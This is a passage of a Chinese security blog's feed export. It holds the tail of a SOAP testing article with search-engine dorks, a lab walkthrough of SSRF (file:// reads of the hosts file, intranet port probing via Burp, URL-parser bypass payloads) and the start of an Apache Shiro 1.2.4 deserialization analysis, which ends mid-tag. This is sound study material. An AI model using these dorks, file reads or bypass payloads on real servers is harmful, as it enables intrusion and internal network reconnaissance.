class="line">inurl:exe?wsdl</span><br><span class="line">inurl:php?wsdl</span><br><span class="line">inurl:pl?wsdl</span><br><span class="line">inurl:?wsdl</span><br><span class="line">filetype:jws</span><br><span class="line">filetype:asmx</span><br><span class="line">filetype:ascx</span><br><span class="line">filetype:aspx</span><br><span class="line">filetype:ashx</span><br><span class="line">filetype:dll</span><br><span class="line">filetype:exe</span><br><span class="line">filetype:php</span><br><span class="line">filetype:pl</span><br><span class="line">filetype:wsdl</span><br></pre></td></tr></table></figure></div><h2 id="五、小结"><a href="#五、小结" class="headerlink" title="五、小结"></a>五、小结</h2><p>通过了解学习后发现，soap 接口测试与常规的测试区别不大，主要区别就是调用的接口使用 XML 格式，测试时需要构造相关表单进行测试。</p><h2 id="六、参考文章"><a href="#六、参考文章" class="headerlink" title="六、参考文章"></a>六、参考文章</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/85410</span><br><span class="line">https://skysec.top/2018/08/17/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</span><br><span class="line">http://emonsec.com/web/51995.html</span><br><span class="line">https://cloud.tencent.com/developer/article/1640199</span><br><span class="line">https://www.cnblogs.com/UniqueColor/p/5788906.html</span><br><span class="line">https://mp.weixin.qq.com/s/UTClGLSvQ3rdUoGeRlvp4w</span><br><span class="line">https://blog.csdn.net/weixin_50464560/article/details/125022377</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞学习 </tag>
            
            <tag> SOAP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB漏洞系列-SSRF(服务器端请求伪造)</title>
      <link href="/2022/10/07/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-SSRF/"/>
      <url>/2022/10/07/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-SSRF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、漏洞原理"><a href="#一、漏洞原理" class="headerlink" title="一、漏洞原理"></a>一、漏洞原理</h2><p>SSRF（Server-Side Request Forgery 服务器端请求伪造）是由攻击者伪造从服务端发起请求的安全漏洞。<code>即攻击者伪造服务端的请求发起攻击，通过服务端作为跳板攻击目标系统</code>。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。因为 SSRF 的存在，请求是由服务端发起，所以能够请求与它相连并与外网隔离的内部系统。<code>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制</code>。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等。</p><h2 id="二、漏洞危害"><a href="#二、漏洞危害" class="headerlink" title="二、漏洞危害"></a>二、漏洞危害</h2><p>SSRF 可以进行内外网的端口和服务探测、主机本地敏感数据的读取、内外网主机应用程序漏洞的探测和利用等。其中 SSRF 分为<code>回显型 SSRF</code> 和<code>非回显型 SSRF</code>，所谓的回显型的 SSRF 就是会将访问到的信息返回给攻击者，而非回显的 SSRF 则不会，但是可以通过dns log或者访问开放&#x2F;未开放的端口导致的延时来判断。</p><h2 id="三、漏洞位置"><a href="#三、漏洞位置" class="headerlink" title="三、漏洞位置"></a>三、漏洞位置</h2><p>能对外网发起访问的功能点都有可能存在 SSRF。例如：(摘抄)</p><table><thead><tr><th>功能点</th><th>具体描述</th></tr></thead><tbody><tr><td>1、社交分享功能</td><td>获取超链接的标题等内容进行显示</td></tr><tr><td>2、转码服务</td><td>通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</td></tr><tr><td>3、在线翻译</td><td>给网址翻译对应网页的内容</td></tr><tr><td>4、图片加载&#x2F;下载</td><td>例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</td></tr><tr><td>5、图片&#x2F;文章收藏功能</td><td>主要网站会取URL地址中title以及文本的内容作为显示以求一个好的用户体验</td></tr><tr><td>6、云服务厂商</td><td>它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试</td></tr><tr><td>7、网站采集，网站抓取的地方</td><td>一些网站会针对你输入的url进行一些信息采集工作</td></tr><tr><td>8、数据库内置功能</td><td>数据库的比如mongodb的copyDatabase函数</td></tr><tr><td>9、邮件系统</td><td>比如接收邮件服务器地址</td></tr><tr><td>10、编码处理, 属性信息处理，文件处理</td><td>比如ffpmg，ImageMagick，docx，pdf，xml处理器等</td></tr><tr><td>11、未公开的api实现以及其他扩展调用URL的功能</td><td>可以利用google 语法加上这些关键字去寻找SSRF漏洞，一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</td></tr><tr><td>12、从远程服务器请求资源</td><td>upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php</td></tr></tbody></table><h2 id="四、漏洞环境搭建"><a href="#四、漏洞环境搭建" class="headerlink" title="四、漏洞环境搭建"></a>四、漏洞环境搭建</h2><p>SSRF 项目源码来自于 <code>https://github.com/sqlsec/ssrf-vuls</code>，本次搭建环境为 <code>Windows10、windwos7 + Phpstudy</code>。</p><p>利用 windows 10与 windwos 7 搭建同网段网站。windows 10 搭建存在 SSRF 漏洞的站点，windwos 7 搭建同网段中存在漏洞的站点，利用 SSRF 漏洞进行同网段漏洞探测</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007163514324.png" data-caption="image-20221007163514324"><img src="/../images/ssrf/image-20221007163514324.png" alt="image-20221007163514324"></a></p><p>windwos 10 新建 SSRF 靶场，即项目源码 <code>172.72.23.21-SSRF</code>，设置为 8002端口</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007171837778.png" data-caption="image-20221007171837778"><img src="/../images/ssrf/image-20221007171837778.png" alt="image-20221007171837778"></a></p><p>搭建完毕后界面，主要就是请输入查询的网站这个输入框，为 SSRF 漏洞点。</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007165405852.png" data-caption="image-20221007165405852"><img src="/../images/ssrf/image-20221007165405852.png" alt="image-20221007165405852"></a></p><p>windows 7 搭建代码注入靶场，对应项目源码 <code>172.72.23.22-CodeExec</code></p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007171909704.png" data-caption="image-20221007171909704"><img src="/../images/ssrf/image-20221007171909704.png" alt="image-20221007171909704"></a></p><p>搭建完毕后界面。</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007165325659.png" data-caption="image-20221007165325659"><img src="/../images/ssrf/image-20221007165325659.png" alt="image-20221007165325659"></a></p><p>搭建 XXE 漏洞靶场,对应项目源码 <code>172.72.23.25-XXE</code></p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007171941968.png" data-caption="image-20221007171941968"><img src="/../images/ssrf/image-20221007171941968.png" alt="image-20221007171941968"></a></p><p>搭建完毕后界面。</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007172006303.png" data-caption="image-20221007172006303"><img src="/../images/ssrf/image-20221007172006303.png" alt="image-20221007172006303"></a></p><h2 id="五、漏洞复现"><a href="#五、漏洞复现" class="headerlink" title="五、漏洞复现"></a>五、漏洞复现</h2><p>由于网站有对外请求的功能点，所以尝试是否存在 SSRF </p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007170010476.png" data-caption="image-20221007170010476"><img src="/../images/ssrf/image-20221007170010476.png" alt="image-20221007170010476"></a></p><p>对外请求测试，测试证明可以对外发起请求</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007170254968.png" data-caption="image-20221007170254968"><img src="/../images/ssrf/image-20221007170254968.png" alt="image-20221007170254968"></a></p><p>尝试对内网发起请求，会不会有响应，测试 127.0.0.1 站点，存在响应，由于该网站端口为 8002 ，测试请求127.0.0.1：8002 端口，即内网请求</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007170432511.png" data-caption="image-20221007170432511"><img src="/../images/ssrf/image-20221007170432511.png" alt="image-20221007170432511"></a></p><p>成功响应，证明存在 SSRF ，为回显型 SSRF</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007170651376.png" data-caption="image-20221007170651376"><img src="/../images/ssrf/image-20221007170651376.png" alt="image-20221007170651376"></a></p><p>利用 Burp 抓包，定位到漏洞参数为 url，此时我们可以利用搞漏洞点进行内网探测。</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007170820274.png" data-caption="image-20221007170820274"><img src="/../images/ssrf/image-20221007170820274.png" alt="image-20221007170820274"></a></p><p>首先，我们可以<code>利用 SSRF 获取本机 hosts 文件</code>，查看本机信息，linux则可以读取 &#x2F;etc&#x2F;passwd、.bash_history 等文件。</p><p>利用 file 协议读取文件，<code>file:///C:\Windows\System32\drivers\etc\hosts</code>，发现存在 192.168.114.0 网段。此时，我们就可以将目标转为对该网段的探测。</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007172122214.png" data-caption="image-20221007172122214"><img src="/../images/ssrf/image-20221007172122214.png" alt="image-20221007172122214"></a></p><p>对 192.168.114.0&#x2F;24，网段进行探测。利用 Burp Custom iterator(自定义迭代器)功能进行爆破。首先，我们需要爆破IP+端口，表现形式为 <code>1:8000</code>，我们有两个参数需要进行爆破，迭代器需要选择2个，以 <code>:</code>，作为分隔符。</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007183132200.png" data-caption="image-20221007183132200"><img src="/../images/ssrf/image-20221007183132200.png" alt="image-20221007183132200"></a></p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007183424214.png" data-caption="image-20221007183424214"><img src="/../images/ssrf/image-20221007183424214.png" alt="image-20221007183424214"></a></p><p>原理已知知道了，这里的不放大字典跑浪费时间了，验证存在即可。</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007183450725.png" data-caption="image-20221007183450725"><img src="/../images/ssrf/image-20221007183450725.png" alt="image-20221007183450725"></a></p><p>通过Funzing 得知同网段中存在 <code>192.168.114.141:9000</code>、<code>192.168.114.141:9001</code> 两个站点</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007184331198.png" data-caption="image-20221007184331198"><img src="/../images/ssrf/image-20221007184331198.png" alt="image-20221007184331198"></a></p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007184353393.png" data-caption="image-20221007184353393"><img src="/../images/ssrf/image-20221007184353393.png" alt="image-20221007184353393"></a></p><p>接下来进行漏洞探测，探测刚才找寻出来的站点是否存在漏洞。</p><h3 id="SSRF-CodeExec-代码执行"><a href="#SSRF-CodeExec-代码执行" class="headerlink" title="SSRF CodeExec 代码执行"></a>SSRF CodeExec 代码执行</h3><p>因为是直接搭建的环境，属于上帝视角，直接来到最后一步了，我们只需要知道，回显型的 SSRF 可以通过返回的信息从而获知是否存在漏洞，从而达到内网探测。</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007184707998.png" data-caption="image-20221007184707998"><img src="/../images/ssrf/image-20221007184707998.png" alt="image-20221007184707998"></a></p><p>这个马儿是环境自带的。</p><p>​</p><h3 id="SSRF-XXE"><a href="#SSRF-XXE" class="headerlink" title="SSRF XXE"></a>SSRF XXE</h3><p>通过回显抓取POST包，并进行探测，在实战中可能存在各种情况，也许只能探测，其他啥也做不了，具体得看具体环境。</p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007185255038.png" data-caption="image-20221007185255038"><img src="/../images/ssrf/image-20221007185255038.png" alt="image-20221007185255038"></a></p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007185308197.png" data-caption="image-20221007185308197"><img src="/../images/ssrf/image-20221007185308197.png" alt="image-20221007185308197"></a></p><p><a data-fancybox="gallery" data-src="/../images/ssrf/image-20221007185521598.png" data-caption="image-20221007185521598"><img src="/../images/ssrf/image-20221007185521598.png" alt="image-20221007185521598"></a></p><p>看到使用 XML 格式，尝试构造 XXE 语句进行漏洞测试。这里留个坑，有兴趣的可以直接查看参考文章第一篇，前辈的环境、讲解、言语友好易懂，值得推荐。</p><h2 id="六、Bypass"><a href="#六、Bypass" class="headerlink" title="六、Bypass"></a>六、Bypass</h2><p>SSRF 测试功能点时，常规 Payload 没有发现存在 SSRF 也许是后台对其进行了过滤，我们就可以通过 Fuzzing 进行 Bypass。后续对 Fuzzing 学习时再进一步深入。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://google.com:80+&amp;@127.88.23.245:22/#+@google.com:80/</span><br><span class="line">http://127.88.23.245:22/+&amp;@google.com:80#+@google.com:80/</span><br><span class="line">http://google.com:80+&amp;@google.com:80#+@127.88.23.245:22/</span><br><span class="line">http://127.88.23.245:22/?@google.com:80/</span><br><span class="line">http://127.88.23.245:22/#@www.google.com:80/</span><br><span class="line">http://google.com:80\\@127.88.23.245:22/</span><br></pre></td></tr></table></figure></div><h2 id="七、小结"><a href="#七、小结" class="headerlink" title="七、小结"></a>七、小结</h2><p>通过前辈们的靶场以及文章，进一步加深对 SSRF 的了解。不积跬步，无以至千里。</p><h2 id="八、参考文章"><a href="#八、参考文章" class="headerlink" title="八、参考文章"></a>八、参考文章</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://www.sqlsec.com/2021/05/ssrf.html</span><br><span class="line">https://mp.weixin.qq.com/s/EYVFHgNClgNGrk_92PZ90A</span><br><span class="line">https://cloud.tencent.com/developer/article/1561355</span><br><span class="line">https://yinwc.github.io/2018/11/16/SSRF/</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞学习 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro反序列化漏洞分析</title>
      <link href="/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>⚠️ 该文章只作学习记录，其文章深度并不能作为学习研究所用，文章漏洞代码分析部分或有乱序，请不要将该文章作为正确的漏洞分析文章，可直接转至参考文章学习漏洞原理。</p><h2 id="二、Java-序列化与反序列化"><a href="#二、Java-序列化与反序列化" class="headerlink" title="二、Java 序列化与反序列化"></a>二、Java 序列化与反序列化</h2><p><code>Java 序列化</code> 是指把 Java <code>对象</code>转换为<code>字节序列</code>的过程便于保存在内存、文件、数据库中，<code>ObjectOutputStream</code> 类的 <code>writeObject()</code> 方法可以实现序列化。 </p><p><code>Java反序列化</code> 是指把<code>字节序列</code>恢复为 Java <code>对象</code> 的过程，<code>ObjectInputStream</code> 类的 <code>readObject()</code> 方法用于反序列化。</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">          <span class="comment">//定义obj对象</span></span><br><span class="line">        String obj=<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">          <span class="comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line">        FileOutputStream fos=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectOutputStream os=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">          <span class="comment">//writeObject()方法将obj对象写入object文件</span></span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line">          <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">          <span class="comment">//恢复对象</span></span><br><span class="line">        String obj2=(String)ois.readObject();</span><br><span class="line">        System.out.print(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；</span><br><span class="line">在网络上传送对象的字节序列,接收方接收到字符序列后，使用反序列化从字节序列中恢复出Java对象;</span><br></pre></td></tr></table></figure></div><br/><hr><h2 id="三、漏洞环境搭建"><a href="#三、漏洞环境搭建" class="headerlink" title="三、漏洞环境搭建"></a>三、漏洞环境搭建</h2><p>1、Shiro源码下载，并导入 IDEA</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928202955004.png" data-caption="image-20220928202955004"><img src="/../images/shiro/image-20220928202955004.png" alt="image-20220928202955004"></a></p><p>2、配置 tomcat 环境</p><p>配置 tomcat 前先配置文件输出路径，不然后续配置 tomcat 会因为没有定义输出路径而报错</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203618300-16643686711181.png" data-caption="image-20220928203618300"><img src="/../images/shiro/image-20220928203618300-16643686711181.png" alt="image-20220928203618300"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203753728.png" data-caption="image-20220928203753728"><img src="/../images/shiro/image-20220928203753728.png" alt="image-20220928203753728"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203915011.png" data-caption="image-20220928203915011"><img src="/../images/shiro/image-20220928203915011.png" alt="image-20220928203915011"></a></p><p>配置 tomcat</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203035559.png" data-caption="image-20220928203035559"><img src="/../images/shiro/image-20220928203035559.png" alt="image-20220928203035559"></a><br><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928203130826.png" data-caption="image-20220928203130826"><img src="/../images/shiro/image-20220928203130826.png" alt="image-20220928203130826"></a><br><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928204038094-16643688406673.png" data-caption="image-20220928204038094"><img src="/../images/shiro/image-20220928204038094-16643688406673.png" alt="image-20220928204038094"></a></p><p>指定漏洞 shiro 反序列漏洞 war 包</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928205231718.png" data-caption="image-20220928205231718"><img src="/../images/shiro/image-20220928205231718.png" alt="image-20220928205231718"></a></p><p>点击右上角运行符号</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928205446844.png" data-caption="image-20220928205446844"><img src="/../images/shiro/image-20220928205446844.png" alt="image-20220928205446844"></a><br>成功搭建</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928205531084.png" data-caption="image-20220928205531084"><img src="/../images/shiro/image-20220928205531084.png" alt="image-20220928205531084"></a></p><p>配置本地IP 方便 burp抓包</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928210335367.png" data-caption="image-20220928210335367"><img src="/../images/shiro/image-20220928210335367.png" alt="image-20220928210335367"></a><br><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928210423508.png" data-caption="image-20220928210423508"><img src="/../images/shiro/image-20220928210423508.png" alt="image-20220928210423508"></a></p><p>配置 JDK</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20220928205046633.png" data-caption="image-20220928205046633"><img src="/../images/shiro/image-20220928205046633.png" alt="image-20220928205046633"></a></p><h2 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h2><h3 id="1、漏洞原理"><a href="#1、漏洞原理" class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h3><p>Shiro≤1.2.4 版本默认使用 CookieRememberMeManager，持久化地将信息序列化后加密后保存在 Cookie 的 rememberMe 字段中，当系统下次读取时先进行解密再反序列化从而获取信息。由于该版本内置了一个默认且固定的由 AES 加密 的硬编码 Key 值 ，因此攻击者可通过使用默认的 Key 对恶意构造的序列化数据进行加密，当 CookieRememberMeManager 对恶意的 rememberMe 进行处理时，最终会对恶意数据进行反序列化，从而导致反序列化漏洞。</p><p>用户获取请求，系统主要处理过程：<code>获取 Cookie 中 rememberMe 的值 -》 对 rememberMe 进行 Base64 解码 -》使用 AES 进行解密 -》对解密的值进行反序列化</code></p><h3 id="2、代码分析"><a href="#2、代码分析" class="headerlink" title="2、代码分析"></a>2、代码分析</h3><h4 id="加密分析"><a href="#加密分析" class="headerlink" title="加密分析"></a>加密分析</h4><p><code>shiro-shiro-root-1.2.4/core/src/main/java/org/apache/shiro/mgtorg/apache/shiro/mgt/DefaultSecurityManager.java</code> 代码中可知，由 rememberMeSuccessfulLogin 方法，定义是否登录成功，创建对象 rmm</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001165149272.png" data-caption="image-20221001165149272"><img src="/../images/shiro/image-20221001165149272.png" alt="image-20221001165149272"></a></p><p>跟进对象的 rmm 的 onSuccessfulLogin 方法，通过全局搜索定位到 onSuccessfulLogin 实现代码位于 AbstractRememberMeManager.java</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001170316531.png" data-caption="image-20221001170316531"><img src="/../images/shiro/image-20221001170316531.png" alt="image-20221001170316531"></a></p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> &#123;</span><br><span class="line">    <span class="comment">//always clear any previous identity:</span></span><br><span class="line">    forgetIdentity(subject);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now save the new identity:</span></span><br><span class="line">    <span class="keyword">if</span> (isRememberMe(token)) &#123;</span><br><span class="line">        rememberIdentity(subject, token, info);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  &quot;</span> +</span><br><span class="line">                      <span class="string">&quot;RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>利用 forgetIdentity 方法对 subject 进行处理</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001170628404.png" data-caption="image-20221001170628404"><img src="/../images/shiro/image-20221001170628404.png" alt="image-20221001170628404"></a></p><p>继续跟进 forgetIdentity 方法，查看其具体实现代码，定位到实现代码位置为 CookieRememberMeManager.java</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001171009787.png" data-caption="image-20221001171009787"><img src="/../images/shiro/image-20221001171009787.png" alt="image-20221001171009787"></a></p><p>代码如下：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">forgetIdentity</span><span class="params">(Subject subject)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (WebUtils.isHttp(subject)) &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(subject);</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(subject);</span><br><span class="line">            forgetIdentity(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Removes the &#x27;rememberMe&#x27; cookie from the associated &#123;<span class="doctag">@link</span> WebSubjectContext&#125;&#x27;s request/response pair.</span></span><br><span class="line"><span class="comment">     * &lt;p/&gt;</span></span><br><span class="line"><span class="comment">     * The &#123;<span class="doctag">@code</span> SubjectContext&#125; instance is expected to be a &#123;<span class="doctag">@link</span> WebSubjectContext&#125; instance with an HTTP</span></span><br><span class="line"><span class="comment">     * Request/Response pair.  If it is not a &#123;<span class="doctag">@code</span> WebSubjectContext&#125; or that &#123;<span class="doctag">@code</span> WebSubjectContext&#125; does not</span></span><br><span class="line"><span class="comment">     * have an HTTP Request/Response pair, this implementation does nothing.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> subjectContext the contextual data, usually provided by a &#123;<span class="doctag">@link</span> Subject.Builder&#125; implementation</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forgetIdentity</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(subjectContext);</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(subjectContext);</span><br><span class="line">            forgetIdentity(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Removes the rememberMe cookie from the given request/response pair.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request  the incoming HTTP servlet request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response the outgoing HTTP servlet response</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">forgetIdentity</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        getCookie().removeFrom(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>通过 getCokie() 获取用户请求的 Cookie ，再执行 removeFrom 方法</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001202501429.png" data-caption="image-20221001202501429"><img src="/../images/shiro/image-20221001202501429.png" 